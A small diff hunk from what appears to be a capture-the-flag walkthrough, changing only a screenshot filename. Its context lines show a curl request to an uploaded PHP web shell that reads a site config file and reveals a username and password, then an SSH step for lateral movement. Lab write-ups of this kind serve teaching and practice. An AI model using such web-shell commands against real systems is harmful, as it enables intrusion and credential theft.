@@ -90,7 +90,7 @@ Output: uid=33(www-data)
 curl "http://uploader.htb/uploads/shell.php5?cmd=cat+/var/www/html/config.php"
 Output: ayush : ayush2025
 
-![Credential Discovery](./screenshot/Screenshot_2026-06-26_13-49-39.png)
+![Credential Discovery](./screenshot/Screenshot_2026-06-28_13-27-39.png)
 
 ### STEP 7:- Lateral Movement
 ssh ayush@{MACHINE_IP} 
